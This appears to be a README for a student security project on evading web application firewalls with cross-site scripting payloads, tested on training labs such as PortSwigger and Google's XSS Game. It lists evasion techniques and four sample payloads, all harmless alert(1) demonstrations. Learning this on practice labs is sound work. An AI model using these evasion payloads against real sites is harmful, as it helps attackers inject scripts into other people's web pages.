# WAF Evasion for XSS

## 🎯 Objectives

- Understand how WAFs block Cross-Site Scripting (XSS) payloads
- Write a Python script that generates multiple XSS payloads using evasion techniques
- Test those payloads on hosted vulnerable web apps
- Document and demonstrate successful WAF evasion attempts

---
## 💻 Python Script: `payload-gen.py`

This script generates XSS payloads that attempt to evade WAFs using methods like:
- Tag breaking (`<scr<script>ipt>`)
- Null byte injection (`<scr\0ipt>`)
- SVG or IMG tags with JavaScript event handlers (`onload`, `onerror`)
- CharCode encoding (`String.fromCharCode()`)

> ✅ **Run it:**
```bash
python3 payload-gen.py
````
## 🧪 Online Testing Platforms Used
-> Portswigger Labs
-> XSS Game by Google

## ✅ Example Payloads
 `<svg/onload=alert(1)>` 
 `<img src=x onerror=alert(1)>`  
 `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>` 
 `&lt;script&gt;alert(1)&lt;/script&gt;`
 
## 📘 Knowledge Gained

* WAFs often block predictable or signature-based payloads
* Obfuscation techniques can bypass many naïve or character-based filters
* Testing on real-world labs helps verify the effectiveness of your payloads

---
 
